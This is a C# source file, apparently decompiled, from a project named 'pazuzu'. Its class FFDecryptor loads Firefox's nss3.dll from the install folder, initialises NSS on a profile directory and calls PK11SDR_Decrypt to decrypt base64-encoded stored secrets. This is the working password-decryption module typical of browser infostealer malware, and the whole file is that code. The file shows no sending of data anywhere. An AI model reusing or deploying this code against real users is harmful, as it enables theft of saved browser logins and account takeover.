using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace pazuzu;

internal static class FFDecryptor
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DLLFunctionDelegate(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

	public struct TSECItem
	{
		public int SECItemType;

		public IntPtr SECItemData;

		public int SECItemLen;
	}

	private static IntPtr NSS3;

	private const string ffFolderName = "\\Mozilla Firefox\\";

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public static long NSS_Init(string configdir)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Mozilla Firefox\\";
		if (!Directory.Exists(text))
		{
			text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
		}
		if (!Directory.Exists(text))
		{
			throw new Exception("Firefox folder not found");
		}
		LoadLibrary(text + "mozglue.dll");
		NSS3 = LoadLibrary(text + "nss3.dll");
		IntPtr procAddress = GetProcAddress(NSS3, "NSS_Init");
		DLLFunctionDelegate dLLFunctionDelegate = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate));
		return dLLFunctionDelegate(configdir);
	}

	public static string Decrypt(string cypherText)
	{
		IntPtr intPtr = IntPtr.Zero;
		new StringBuilder(cypherText);
		try
		{
			byte[] array = Convert.FromBase64String(cypherText);
			intPtr = Marshal.AllocHGlobal(array.Length);
			Marshal.Copy(array, 0, intPtr, array.Length);
			TSECItem result = default(TSECItem);
			TSECItem data = default(TSECItem);
			data.SECItemType = 0;
			data.SECItemData = intPtr;
			data.SECItemLen = array.Length;
			if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
			{
				byte[] array2 = new byte[result.SECItemLen];
				Marshal.Copy(result.SECItemData, array2, 0, result.SECItemLen);
				return Encoding.ASCII.GetString(array2);
			}
		}
		catch (Exception ex)
		{
			_ = ex.Message;
			return null;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return null;
	}

	public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
	{
		IntPtr procAddress = GetProcAddress(NSS3, "PK11SDR_Decrypt");
		DLLFunctionDelegate5 dLLFunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
		return dLLFunctionDelegate(ref data, ref result, cx);
	}
}
